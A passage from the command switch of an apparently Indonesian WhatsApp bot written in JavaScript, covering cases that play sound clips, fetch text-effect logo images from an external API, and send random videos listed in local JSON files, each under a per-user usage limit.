                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                addCountCmd('#sound63', sender, _cmd)
                conn.sendMessage(from, { audio: { url: './lib/sound/sound63.mp3' }, mimetype: 'audio/mp4', ptt: true}, { quoted: msg })
                limitAdd(sender, limit)
                break
            case prefix+'sound64':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                addCountCmd('#sound64', sender, _cmd)
                conn.sendMessage(from, { audio: { url: './lib/sound/sound64.mp3' }, mimetype: 'audio/mp4', ptt: true}, { quoted: msg })
                limitAdd(sender, limit)
                break
            case prefix+'sound65':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                addCountCmd('#sound65', sender, _cmd)
                conn.sendMessage(from, { audio: { url: './lib/sound/sound65.mp3' }, mimetype: 'audio/mp4', ptt: true}, { quoted: msg })
                limitAdd(sender, limit)
                break
            case prefix+'sound66':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                addCountCmd('#sound66', sender, _cmd)
                conn.sendMessage(from, { audio: { url: './lib/sound/sound66.mp3' }, mimetype: 'audio/mp4', ptt: true}, { quoted: msg })
                limitAdd(sender, limit)
                break
            case prefix+'sound67':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                addCountCmd('#sound67', sender, _cmd)
                conn.sendMessage(from, { audio: { url: './lib/sound/sound67.mp3' }, mimetype: 'audio/mp4', ptt: true}, { quoted: msg })
                limitAdd(sender, limit)
                break
            case prefix+'sound68':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                addCountCmd('#sound68', sender, _cmd)
                conn.sendMessage(from, { audio: { url: './lib/sound/sound68.mp3' }, mimetype: 'audio/mp4', ptt: true}, { quoted: msg })
                limitAdd(sender, limit)
                break
            case prefix+'sound69':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                addCountCmd('#sound69', sender, _cmd)
                conn.sendMessage(from, { audio: { url: './lib/sound/sound69.mp3' }, mimetype: 'audio/mp4', ptt: true}, { quoted: msg })
                limitAdd(sender, limit)
                break
            case prefix+'sound70':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                addCountCmd('#sound70', sender, _cmd)
                conn.sendMessage(from, { audio: { url: './lib/sound/sound70.mp3' }, mimetype: 'audio/mp4', ptt: true}, { quoted: msg })
                limitAdd(sender, limit)
                break
            case prefix+'sound71':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                addCountCmd('#sound71', sender, _cmd)
                conn.sendMessage(from, { audio: { url: './lib/sound/sound71.mp3' }, mimetype: 'audio/mp4', ptt: true}, { quoted: msg })
                limitAdd(sender, limit)
                break
            case prefix+'sound72':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                addCountCmd('#sound72', sender, _cmd)
                conn.sendMessage(from, { audio: { url: './lib/sound/sound72.mp3' }, mimetype: 'audio/mp4', ptt: true}, { quoted: msg })
                limitAdd(sender, limit)
                break
            case prefix+'sound73':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                addCountCmd('#sound73', sender, _cmd)
                conn.sendMessage(from, { audio: { url: './lib/sound/sound73.mp3' }, mimetype: 'audio/mp4', ptt: true}, { quoted: msg })
                limitAdd(sender, limit)
                break
            case prefix+'sound74':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                addCountCmd('#sound74', sender, _cmd)
                conn.sendMessage(from, { audio: { url: './lib/sound/sound74.mp3' }, mimetype: 'audio/mp4', ptt: true}, { quoted: msg })
                limitAdd(sender, limit)
                break
            // Textpro Menu
            case prefix+'pencil':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                if (args.length < 2) return reply(`Kirim perintah ${command} Riy 04`)
                if (q.length > 10) return reply(`Teksnya kebanyakan`)
                addCountCmd('#pencil', sender, _cmd)
                reply("_Wait a minute, data is being processed!_")
                var riy = `https://rest-api-riy.herokuapp.com/api/textpro/pencil?text=${q}`
                conn.sendMessage(from, { caption: 'Dont Forget Subscribe\nhttps://youtube.com/c/Riy', image: { url: riy }}, { quoted: msg})
                limitAdd(sender, limit)
                break
            case prefix+'glitch':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                if (args.length < 2) return reply(`Kirim perintah ${command} Riy 04`)
                if (q.length > 10) return reply(`Teksnya kebanyakan`)
                addCountCmd('#glitch', sender, _cmd)
                reply("_Wait a minute, data is being processed!_")
                var riy = `https://rest-api-riy.herokuapp.com/api/textpro/glitch?text=${q}`
                conn.sendMessage(from, { caption: 'Dont Forget Subscribe\nhttps://youtube.com/c/Riy', image: { url: riy }}, { quoted: msg})
                limitAdd(sender, limit)
                break
            case prefix+'black-pink':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                if (args.length < 2) return reply(`Kirim perintah ${command} Riy 04`)
                if (q.length > 10) return reply(`Teksnya kebanyakan`)
                addCountCmd('#black-pink', sender, _cmd)
                reply("_Wait a minute, data is being processed!_")
                var riy = `https://rest-api-riy.herokuapp.com/api/textpro/blackpink?text=${q}`
                conn.sendMessage(from, { caption: 'Dont Forget Subscribe\nhttps://youtube.com/c/Riy', image: { url: riy }}, { quoted: msg})
                limitAdd(sender, limit)
                break
            case prefix+'neon':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                if (args.length < 2) return reply(`Kirim perintah ${command} Riy 04`)
                if (q.length > 10) return reply(`Teksnya kebanyakan`)
                addCountCmd('#neon', sender, _cmd)
                reply("_Wait a minute, data is being processed!_")
                var riy = `https://rest-api-riy.herokuapp.com/api/textpro/neon?text=${q}`
                conn.sendMessage(from, { caption: 'Dont Forget Subscribe\nhttps://youtube.com/c/Riy', image: { url: riy }}, { quoted: msg})
                limitAdd(sender, limit)
                break
            case prefix+'logo-bear':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                if (args.length < 2) return reply(`Kirim perintah ${command} Riy 04`)
                if (q.length > 10) return reply(`Teksnya kebanyakan`)
                addCountCmd('#logo-bear', sender, _cmd)
                reply("_Wait a minute, data is being processed!_")
                var riy = `https://rest-api-riy.herokuapp.com/api/textpro/logobear?text=${q}`
                conn.sendMessage(from, { caption: 'Dont Forget Subscribe\nhttps://youtube.com/c/Riy', image: { url: riy }}, { quoted: msg})
                limitAdd(sender, limit)
                break
            case prefix+'3d-christmas':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                if (args.length < 2) return reply(`Kirim perintah ${command} Riy 04`)
                if (q.length > 10) return reply(`Teksnya kebanyakan`)
                addCountCmd('#3d-christmas', sender, _cmd)
                reply("_Wait a minute, data is being processed!_")
                var riy = `https://rest-api-riy.herokuapp.com/api/textpro/3dchristmas?text=${q}`
                conn.sendMessage(from, { caption: 'Dont Forget Subscribe\nhttps://youtube.com/c/Riy', image: { url: riy }}, { quoted: msg})
                limitAdd(sender, limit)
                break
            case prefix+'glitch2':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                if (args.length < 2) return reply(`Kirim perintah ${command} text1|text2`)
                if (!q.includes('|')) return reply(`Format salah, contoh pemakaian ${command} Riy|04`)
                if (q.length > 13) return reply(`Teksnya kebanyakan`)
                var tek1 = q.split('|')[0]
                var tek2 = q.split('|')[1]
                if (!tek2) return reply(`Format salah, contoh pemakaian ${command} Riy|04`)
                if (tek1.length > 6) return reply(`Teks 1 kepanjangan`)
                if (tek2.length > 6) return reply(`Teks 2 kepanjangan`)
                addCountCmd('#glitch2', sender, _cmd)
                reply("_Wait a minute, data is being processed!_")
                var riy = `https://rest-api-riy.herokuapp.com/api/textpro/glitch2?text=${tek1}&text2=${tek2}`
                conn.sendMessage(from, { caption: 'Dont Forget Subscribe\nhttps://youtube.com/c/Riy', image: { url: riy }}, { quoted: msg})
                limitAdd(sender, limit)
                break
            case prefix+'thunder':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                if (args.length < 2) return reply(`Kirim perintah ${command} Riy 04`)
                if (q.length > 10) return reply(`Teksnya kebanyakan`)
                addCountCmd('#thunder', sender, _cmd)
                reply("_Wait a minute, data is being processed!_")
                var riy = `https://rest-api-riy.herokuapp.com/api/textpro/thunder?text=${q}`
                conn.sendMessage(from, { caption: 'Dont Forget Subscribe\nhttps://youtube.com/c/Riy', image: { url: riy }}, { quoted: msg})
                limitAdd(sender, limit)
                break
            case prefix+'3d-box-text':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                if (args.length < 2) return reply(`Kirim perintah ${command} Riy 04`)
                if (q.length > 10) return reply(`Teksnya kebanyakan`)
                addCountCmd('#3d-box-text', sender, _cmd)
                reply("_Wait a minute, data is being processed!_")
                var riy = `https://rest-api-riy.herokuapp.com/api/textpro/3dboxtext?text=${q}`
                conn.sendMessage(from, { caption: 'Dont Forget Subscribe\nhttps://youtube.com/c/Riy', image: { url: riy }}, { quoted: msg})
                limitAdd(sender, limit)
                break
            case prefix+'tiktok-logo':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                if (args.length < 2) return reply(`Kirim perintah ${command} text1|text2`)
                if (!q.includes('|')) return reply(`Format salah, contoh pemakaian ${command} Riy|04`)
                if (q.length > 13) return reply(`Teksnya kebanyakan`)
                var tek1 = q.split('|')[0]
                var tek2 = q.split('|')[1]
                if (!tek2) return reply(`Format salah, contoh pemakaian ${command} Riy|04`)
                if (tek1.length > 6) return reply(`Teks 1 kepanjangan`)
                if (tek2.length > 6) return reply(`Teks 2 kepanjangan`)
                addCountCmd('#tiktok-logo', sender, _cmd)
                reply("_Wait a minute, data is being processed!_")
                var riy = `https://rest-api-riy.herokuapp.com/api/textpro/glitchtiktok?text=${tek1}&text2=${tek2}`
                conn.sendMessage(from, { caption: 'Dont Forget Subscribe\nhttps://youtube.com/c/Riy', image: { url: riy }}, { quoted: msg})
                limitAdd(sender, limit)
                break
            case prefix+'video-game-classic':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                if (args.length < 2) return reply(`Kirim perintah ${command} text1|text2`)
                if (!q.includes('|')) return reply(`Format salah, contoh pemakaian ${command} Riy|04`)
                if (q.length > 13) return reply(`Teksnya kebanyakan`)
                var tek1 = q.split('|')[0]
                var tek2 = q.split('|')[1]
                if (!tek2) return reply(`Format salah, contoh pemakaian ${command} Riy|04`)
                if (tek1.length > 6) return reply(`Teks 1 kepanjangan`)
                if (tek2.length > 6) return reply(`Teks 2 kepanjangan`)
                addCountCmd('#video-game-classic', sender, _cmd)
                reply("_Wait a minute, data is being processed!_")
                var riy = `https://rest-api-riy.herokuapp.com/api/textpro/video-game-classic?text=${tek1}&text2=${tek2}`
                conn.sendMessage(from, { caption: 'Dont Forget Subscribe\nhttps://youtube.com/c/Riy', image: { url: riy }}, { quoted: msg})
                limitAdd(sender, limit)
                break
            case prefix+'ninja-logo':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                if (args.length < 2) return reply(`Kirim perintah ${command} text1|text2`)
                if (!q.includes('|')) return reply(`Format salah, contoh pemakaian ${command} Riy|04`)
                if (q.length > 13) return reply(`Teksnya kebanyakan`)
                var tek1 = q.split('|')[0]
                var tek2 = q.split('|')[1]
                if (!tek2) return reply(`Format salah, contoh pemakaian ${command} Riy|04`)
                if (tek1.length > 6) return reply(`Teks 1 kepanjangan`)
                if (tek2.length > 6) return reply(`Teks 2 kepanjangan`)
                addCountCmd('#ninja-logo', sender, _cmd)
                reply("_Wait a minute, data is being processed!_")
                var riy = `https://rest-api-riy.herokuapp.com/api/textpro/ninja-logo?text=${tek1}&text2=${tek2}`
                conn.sendMessage(from, { caption: 'Dont Forget Subscribe\nhttps://youtube.com/c/Riy', image: { url: riy }}, { quoted: msg})
                limitAdd(sender, limit)
                break
            case prefix+'marvel-studios':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                if (args.length < 2) return reply(`Kirim perintah ${command} text1|text2`)
                if (!q.includes('|')) return reply(`Format salah, contoh pemakaian ${command} Riy|04`)
                if (q.length > 13) return reply(`Teksnya kebanyakan`)
                var tek1 = q.split('|')[0]
                var tek2 = q.split('|')[1]
                if (!tek2) return reply(`Format salah, contoh pemakaian ${command} Riy|04`)
                if (tek1.length > 6) return reply(`Teks 1 kepanjangan`)
                if (tek2.length > 6) return reply(`Teks 2 kepanjangan`)
                addCountCmd('#marvel-studios', sender, _cmd)
                reply("_Wait a minute, data is being processed!_")
                var riy = `https://rest-api-riy.herokuapp.com/api/textpro/marvel-studios?text=${tek1}&text2=${tek2}`
                conn.sendMessage(from, { caption: 'Dont Forget Subscribe\nhttps://youtube.com/c/Riy', image: { url: riy }}, { quoted: msg})
                limitAdd(sender, limit)
                break
            case prefix+'green-horror':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                if (args.length < 2) return reply(`Kirim perintah ${command} Riy 04`)
                if (q.length > 10) return reply(`Teksnya kebanyakan`)
                addCountCmd('#green-horror', sender, _cmd)
                reply("_Wait a minute, data is being processed!_")
                var riy = `https://rest-api-riy.herokuapp.com/api/textpro/green-horror?text=${q}`
                conn.sendMessage(from, { caption: 'Dont Forget Subscribe\nhttps://youtube.com/c/Riy', image: { url: riy }}, { quoted: msg})
                limitAdd(sender, limit)
                break
            case prefix+'magma':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                if (args.length < 2) return reply(`Kirim perintah ${command} Riy 04`)
                if (q.length > 10) return reply(`Teksnya kebanyakan`)
                addCountCmd('#magma', sender, _cmd)
                reply("_Wait a minute, data is being processed!_")
                var riy = `https://rest-api-riy.herokuapp.com/api/textpro/magma?text=${q}`
                conn.sendMessage(from, { caption: 'Dont Forget Subscribe\nhttps://youtube.com/c/Riy', image: { url: riy }}, { quoted: msg})
                limitAdd(sender, limit)
                break
            case prefix+'3d-neon-light':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                if (args.length < 2) return reply(`Kirim perintah ${command} Riy 04`)
                if (q.length > 10) return reply(`Teksnya kebanyakan`)
                addCountCmd('#3d-neon-light', sender, _cmd)
                reply("_Wait a minute, data is being processed!_")
                var riy = `https://rest-api-riy.herokuapp.com/api/textpro/3d-neon-light?text=${q}`
                conn.sendMessage(from, { caption: 'Dont Forget Subscribe\nhttps://youtube.com/c/Riy', image: { url: riy }}, { quoted: msg})
                limitAdd(sender, limit)
                break
            case prefix+'3d-orange-juice':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                if (args.length < 2) return reply(`Kirim perintah ${command} Riy 04`)
                if (q.length > 10) return reply(`Teksnya kebanyakan`)
                addCountCmd('#3d-orange-juice', sender, _cmd)
                reply("_Wait a minute, data is being processed!_")
                var riy = `https://rest-api-riy.herokuapp.com/api/textpro/3d-orange-juice?text=${q}`
                conn.sendMessage(from, { caption: 'Dont Forget Subscribe\nhttps://youtube.com/c/Riy', image: { url: riy }}, { quoted: msg})
                limitAdd(sender, limit)
                break
            case prefix+'chocolate-cake':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                if (args.length < 2) return reply(`Kirim perintah ${command} Riy 04`)
                if (q.length > 10) return reply(`Teksnya kebanyakan`)
                addCountCmd('#chocolate-cake', sender, _cmd)
                reply("_Wait a minute, data is being processed!_")
                var riy = `https://rest-api-riy.herokuapp.com/api/textpro/chocolate-cake?text=${q}`
                conn.sendMessage(from, { caption: 'Dont Forget Subscribe\nhttps://youtube.com/c/Riy', image: { url: riy }}, { quoted: msg})
                limitAdd(sender, limit)
                break
            case prefix+'strawberry':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                if (args.length < 2) return reply(`Kirim perintah ${command} Riy 04`)
                if (q.length > 10) return reply(`Teksnya kebanyakan`)
                addCountCmd('#strawberry', sender, _cmd)
                reply("_Wait a minute, data is being processed!_")
                var riy = `https://rest-api-riy.herokuapp.com/api/textpro/strawberry?text=${q}`
                conn.sendMessage(from, { caption: 'Dont Forget Subscribe\nhttps://youtube.com/c/Riy', image: { url: riy }}, { quoted: msg})
                limitAdd(sender, limit)
                break
            // Photooxy Menu
            case prefix+'flaming':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                if (args.length < 2) return reply(`Kirim perintah ${command} Riy 04`)
                if (q.length > 10) return reply(`Teksnya kebanyakan`)
                addCountCmd('#flaming', sender, _cmd)
                reply("_Wait a minute, data is being processed!_")
                var riy = `https://rest-api-riy.herokuapp.com/api/photooxy/flaming?text=${q}`
                conn.sendMessage(from, { caption: 'Dont Forget Subscribe\nhttps://youtube.com/c/Riy', image: { url: riy }}, { quoted: msg})
                limitAdd(sender, limit)
                break
             case prefix+'shadow-sky':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                if (args.length < 2) return reply(`Kirim perintah ${command} Riy 04`)
                if (q.length > 10) return reply(`Teksnya kebanyakan`)
                addCountCmd('#shadow-sky', sender, _cmd)
                reply("_Wait a minute, data is being processed!_")
                var riy = `https://rest-api-riy.herokuapp.com/api/photooxy/shadow-sky?text=${q}`
                conn.sendMessage(from, { caption: 'Dont Forget Subscribe\nhttps://youtube.com/c/Riy', image: { url: riy }}, { quoted: msg})
                limitAdd(sender, limit)
                break
             case prefix+'naruto':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                if (args.length < 2) return reply(`Kirim perintah ${command} Riy 04`)
                if (q.length > 10) return reply(`Teksnya kebanyakan`)
                addCountCmd('#naruto', sender, _cmd)
                reply("_Wait a minute, data is being processed!_")
                var riy = `https://rest-api-riy.herokuapp.com/api/photooxy/naruto?text=${q}`
                conn.sendMessage(from, { caption: 'Dont Forget Subscribe\nhttps://youtube.com/c/Riy', image: { url: riy }}, { quoted: msg})
                limitAdd(sender, limit)
                break
             case prefix+'pubg':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                if (args.length < 2) return reply(`Kirim perintah ${command} text1|text2`)
                if (!q.includes('|')) return reply(`Format salah, contoh pemakaian ${command} Riy|04`)
                if (q.length > 13) return reply(`Teksnya kebanyakan`)
                var tek1 = q.split('|')[0]
                var tek2 = q.split('|')[1]
                if (!tek2) return reply(`Format salah, contoh pemakaian ${command} Riy|04`)
                if (tek1.length > 6) return reply(`Teks 1 kepanjangan`)
                if (tek2.length > 6) return reply(`Teks 2 kepanjangan`)
                addCountCmd('#pubg', sender, _cmd)
                reply("_Wait a minute, data is being processed!_")
                var riy = `https://rest-api-riy.herokuapp.com/api/photooxy/pubg?text1=${tek1}&text2=${tek2}`
                conn.sendMessage(from, { caption: 'Dont Forget Subscribe\nhttps://youtube.com/c/Riy', image: { url: riy }}, { quoted: msg})
                limitAdd(sender, limit)
                break
             case prefix+'under-grass':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                if (args.length < 2) return reply(`Kirim perintah ${command} Riy 04`)
                if (q.length > 10) return reply(`Teksnya kebanyakan`)
                addCountCmd('#under-grass', sender, _cmd)
                reply("_Wait a minute, data is being processed!_")
                var riy = `https://rest-api-riy.herokuapp.com/api/photooxy/under-grass?text=${q}`
                conn.sendMessage(from, { caption: 'Dont Forget Subscribe\nhttps://youtube.com/c/Riy', image: { url: riy }}, { quoted: msg})
                limitAdd(sender, limit)
                break
             case prefix+'harry-potter':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                if (args.length < 2) return reply(`Kirim perintah ${command} Riy 04`)
                if (q.length > 10) return reply(`Teksnya kebanyakan`)
                addCountCmd('#harry-potter', sender, _cmd)
                reply("_Wait a minute, data is being processed!_")
                var riy = `https://rest-api-riy.herokuapp.com/api/photooxy/harry-potter?text=${q}`
                conn.sendMessage(from, { caption: 'Dont Forget Subscribe\nhttps://youtube.com/c/Riy', image: { url: riy }}, { quoted: msg})
                limitAdd(sender, limit)
                break
             case prefix+'flower-typography':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                if (args.length < 2) return reply(`Kirim perintah ${command} Riy 04`)
                if (q.length > 10) return reply(`Teksnya kebanyakan`)
                addCountCmd('#flower-typography', sender, _cmd)
                reply("_Wait a minute, data is being processed!_")
                var riy = `https://rest-api-riy.herokuapp.com/api/photooxy/flower-typography?text=${q}`
                conn.sendMessage(from, { caption: 'Dont Forget Subscribe\nhttps://youtube.com/c/Riy', image: { url: riy }}, { quoted: msg})
                limitAdd(sender, limit)
                break
             case prefix+'picture-of-love':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                if (args.length < 2) return reply(`Kirim perintah ${command} Riy 04`)
                if (q.length > 10) return reply(`Teksnya kebanyakan`)
                addCountCmd('#picture-of-love', sender, _cmd)
                reply("_Wait a minute, data is being processed!_")
                var riy = `https://rest-api-riy.herokuapp.com/api/photooxy/picture-of-love?text=${q}`
                conn.sendMessage(from, { caption: 'Dont Forget Subscribe\nhttps://youtube.com/c/Riy', image: { url: riy }}, { quoted: msg})
                limitAdd(sender, limit)
                break
             case prefix+'coffee-cup':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                if (args.length < 2) return reply(`Kirim perintah ${command} Riy 04`)
                if (q.length > 10) return reply(`Teksnya kebanyakan`)
                addCountCmd('#coffee-cup', sender, _cmd)
                reply("_Wait a minute, data is being processed!_")
                var riy = `https://rest-api-riy.herokuapp.com/api/photooxy/coffee-cup?text=${q}`
                conn.sendMessage(from, { caption: 'Dont Forget Subscribe\nhttps://youtube.com/c/Riy', image: { url: riy }}, { quoted: msg})
                limitAdd(sender, limit)
                break
            case prefix+'night-sky':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                if (args.length < 2) return reply(`Kirim perintah ${command} Riy 04`)
                if (q.length > 10) return reply(`Teksnya kebanyakan`)
                addCountCmd('#night-sky', sender, _cmd)
                reply("_Wait a minute, data is being processed!_")
                var riy = `https://rest-api-riy.herokuapp.com/api/photooxy/night-sky?text=${q}`
                conn.sendMessage(from, { caption: 'Dont Forget Subscribe\nhttps://youtube.com/c/Riy', image: { url: riy }}, { quoted: msg})
                limitAdd(sender, limit)
                break
            case prefix+'carved-wood':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                if (args.length < 2) return reply(`Kirim perintah ${command} Riy 04`)
                if (q.length > 10) return reply(`Teksnya kebanyakan`)
                addCountCmd('#carved-wood', sender, _cmd)
                reply("_Wait a minute, data is being processed!_")
                var riy = `https://rest-api-riy.herokuapp.com/api/photooxy/carved-wood?text=${q}`
                conn.sendMessage(from, { caption: 'Dont Forget Subscribe\nhttps://youtube.com/c/Riy', image: { url: riy }}, { quoted: msg})
                limitAdd(sender, limit)
                break
            case prefix+'illuminated-metallic':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                if (args.length < 2) return reply(`Kirim perintah ${command} Riy 04`)
                if (q.length > 10) return reply(`Teksnya kebanyakan`)
                addCountCmd('#illuminated-metallic', sender, _cmd)
                reply("_Wait a minute, data is being processed!_")
                var riy = `https://rest-api-riy.herokuapp.com/api/photooxy/illuminated-metallic?text=${q}`
                conn.sendMessage(from, { caption: 'Dont Forget Subscribe\nhttps://youtube.com/c/Riy', image: { url: riy }}, { quoted: msg})
                limitAdd(sender, limit)
                break
            case prefix+'sweet-candy':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                if (args.length < 2) return reply(`Kirim perintah ${command} Riy 04`)
                if (q.length > 10) return reply(`Teksnya kebanyakan`)
                addCountCmd('#sweet-candy', sender, _cmd)
                reply("_Wait a minute, data is being processed!_")
                var riy = `https://rest-api-riy.herokuapp.com/api/photooxy/sweet-candy?text=${q}`
                conn.sendMessage(from, { caption: 'Dont Forget Subscribe\nhttps://youtube.com/c/Riy', image: { url: riy }}, { quoted: msg})
                limitAdd(sender, limit)
                break
            // Asupan Menu
            case prefix+'bocil':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                addCountCmd('#bocil', sender, _cmd)
                reply("_Wait a minute, data is being processed!_")
                var data = JSON.parse(fs.readFileSync('./lib/asupan/bocil.json'))
                data = pickRandom(data)
                conn.sendMessage(from, { caption: 'Dont Forget Subscribe\nhttps://youtube.com/c/Riy', video: { url: data.url }}, { quoted: msg})
                limitAdd(sender, limit)
                break
             case prefix+'geayubi':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                addCountCmd('#geayubi', sender, _cmd)
                reply("_Wait a minute, data is being processed!_")
                var data = JSON.parse(fs.readFileSync('./lib/asupan/geayubi.json'))
                data = pickRandom(data)
                conn.sendMessage(from, { caption: 'Dont Forget Subscribe\nhttps://youtube.com/c/Riy', video: { url: data.url }}, { quoted: msg})
                limitAdd(sender, limit)
                break
             case prefix+'hijaber':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                addCountCmd('#hijaber', sender, _cmd)
                reply("_Wait a minute, data is being processed!_")
                var data = JSON.parse(fs.readFileSync('./lib/asupan/hijaber.json'))
                data = pickRandom(data)
                conn.sendMessage(from, { caption: 'Dont Forget Subscribe\nhttps://youtube.com/c/Riy', video: { url: data.url }}, { quoted: msg})
                limitAdd(sender, limit)
                break
             case prefix+'rikagusriani':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                addCountCmd('#rikagusriani', sender, _cmd)
                reply("_Wait a minute, data is being processed!_")
                var data = JSON.parse(fs.readFileSync('./lib/asupan/rikagusriani.json'))
                data = pickRandom(data)
                conn.sendMessage(from, { caption: 'Dont Forget Subscribe\nhttps://youtube.com/c/Riy', video: { url: data.url }}, { quoted: msg})
                limitAdd(sender, limit)
                break
             case prefix+'santuy':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                addCountCmd('#santuy', sender, _cmd)
                reply("_Wait a minute, data is being processed!_")
                var data = JSON.parse(fs.readFileSync('./lib/asupan/santuy.json'))
                data = pickRandom(data)
